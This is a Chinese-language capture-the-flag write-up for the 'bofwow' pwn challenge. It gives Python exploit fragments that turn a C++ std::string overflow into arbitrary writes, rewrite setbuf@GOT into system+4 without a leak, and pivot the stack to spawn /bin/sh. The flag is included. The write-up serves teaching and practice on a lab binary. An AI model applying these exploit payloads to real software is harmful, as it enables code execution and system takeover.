# bofwow

## 题目简述

这题沿用 `bofww` 的姓名输入漏洞，但删除了 `win()`。`input_person` 仍把无长度限制的 `std::cin >> _name` 写入 `char _name[0x100]`，随后执行 `name = _name`。跨栈帧溢出可以破坏调用者的 `std::string name` 元数据，把这次赋值变成定向写；同时又能覆盖 canary、保存的 `rbp` 和返回地址。

二进制 non-PIE、Partial RELRO，附带运行时 `libc.so.6`。目标是在没有地址泄露、没有现成 `win` 的条件下完成以下链：

1. 反复重入 `main`，获得多次定向写；
2. 用两个现有 gadget 对已经解析的 `setbuf@GOT` 做 32 位加法，把它改成 `system+4`；
3. 构造栈迁移，令 `rdi` 指向 `/bin/sh` 并跳入改写后的 libc 地址。

决定性障碍是从 C++ 对象破坏建立任意地址写，再完成 GOT 增量改写和多次栈迁移，归入 `pwn`。

## 解题过程

### 1. 由 `std::string` 元数据得到定向写

与 `bofww` 相同，把溢出末尾布置为目标地址、伪造长度和伪造容量后，`name = _name` 会把 `_name` 开头的短 C 字符串写到指定位置。官方脚本封装为：

```python
def aaw(addr, value):
    payload  = p64(value)
    payload += b"\x00" * 0x128
    payload += p64(addr)
    payload += p64(0x1000)
    payload += p64(0x1000)
    sock.sendlineafter("? ", payload)
    sock.sendlineafter("? ", 0xdead)
```

这里 `p64(value)` 中出现的第一个 NUL 会终止源 C 字符串；赋值会写入有效低字节并补 NUL。官方选取的地址和数值都适配这种短写，不能把该封装误解为无条件写满任意 8 字节。

先把 `__stack_chk_fail@GOT` 改成 `main`。姓名溢出破坏 canary 后，检查失败本应终止进程，现在却重新进入 `main`，从而可以重复调用 `aaw`：

```python
payload  = p64(elf.symbol("main"))
payload += b"\x00" * 0x128
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000) * 2
```

### 2. 不泄露 libc 也能把 `setbuf` 改成 `system+4`

`setup()` 已经调用过 `setbuf`，所以其 GOT 中保存的是当前 ASLR 实例下的真实 libc 地址。附带 libc 允许计算不含基址的常量差：

$$
\Delta=(\operatorname{off}(system)+4)-\operatorname{off}(setbuf).
$$

把 `/bin/sh\0` 和一段伪栈写入固定可写区：

```python
addr_cmd = 0x4040a0
aaw(addr_cmd, u64(b"/bin/sh\0"))

addr_chain = 0x404f00
g_add = next(elf.gadget("add [rbp-0x3d], ebx; nop; ret"))
g_load = next(elf.gadget("mov ebx, [rbp-8]; leave; ret"))

aaw(addr_chain - 8, (libc.symbol("system") + 4) - libc.symbol("setbuf"))
aaw(addr_chain, elf.got("setbuf") + 0x3d)
aaw(addr_chain + 8, g_add)
aaw(addr_chain + 0x10, elf.symbol("main"))
```

接着把 `__stack_chk_fail@GOT` 临时改成单个 `ret`，使 canary 失败调用立即返回，之后才会落到已覆盖的函数尾部控制数据。令保存的 `rbp=addr_chain`，返回地址为 `g_load`：

```python
payload  = p64(next(elf.gadget("ret")))
payload += b"\x00" * 0x108
payload += p64(addr_chain)
payload += p64(g_load)
payload += b"A" * 0x10
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000) * 2
```

执行时：

1. `g_load` 从 `[rbp-8]` 取出 $\Delta$ 的低 32 位到 `ebx`；
2. `leave; ret` 从 `addr_chain` 取出新 `rbp=setbuf@GOT+0x3d`，再跳到 `g_add`；
3. `g_add` 对 `[rbp-0x3d]=setbuf@GOT` 加上 `ebx`；
4. GOT 项从真实 `setbuf` 变成同一 libc 基址下的 `system+4`，随后返回 `main`。

这条链利用相对偏移抵消 ASLR，不需要先泄露 libc 基址。

### 3. 设置 `rdi` 并跳入 system

重新把 `__stack_chk_fail@GOT` 指向 `main` 取得下一轮写入机会，然后准备第二段伪栈：

```python
addr_chain = 0x404f38
g_arg = next(elf.gadget("mov edi, 0x4040a0; jmp rax"))
g_rax = next(elf.gadget("mov rax, [rbp-0x18]; leave; ret"))
g_leave = next(elf.gadget("leave; ret"))

aaw(addr_chain + 8, g_arg)
aaw(elf.got("setbuf") + 0x18, addr_chain)
aaw(elf.got("setbuf") + 0x20, g_leave)
```

最终溢出令保存的 `rbp=setbuf@GOT+0x18`，返回到 `g_rax`。该 gadget 从 `[rbp-0x18]`，也就是 `setbuf@GOT`，把 `system+4` 取到 `rax`；连续两次 `leave; ret` 把栈迁移到 `addr_chain`，再执行 `g_arg`：

```asm
mov edi, 0x4040a0
jmp rax
```

于是 `rdi` 指向 `/bin/sh`，控制流跳到 `system+4`，获得 shell。最终读取：

```text
CakeCTF{1_h3r3by_c3rt1fy_th4t_y0u_h4v3_c0mpl3ted_3very7h1ng_4b0ut_ROP}
```

## 方法总结

- 核心技巧：把被破坏的 `std::string` 赋值变成可重复短写；在无泄露条件下，用已解析 GOT 地址与已知 libc 符号差做 `add-what-where`；再用 `leave; ret` 串联两次栈迁移。
- 识别信号：C++ 栈溢出后仍有字符串赋值；`__stack_chk_fail@GOT` 可写；non-PIE 提供固定伪栈与 gadget；构造函数提前解析某个 libc 函数；题目附带匹配 libc。
- 复用要点：先区分“完整 8 字节写”和“遇 NUL 截断的 C 字符串短写”。GOT 增量法依赖目标函数已解析、两符号位于同一 libc，且 32 位加法不会破坏所需高位；每次把 canary 失败改成 `main` 或 `ret` 的目的也不同，不能混用。
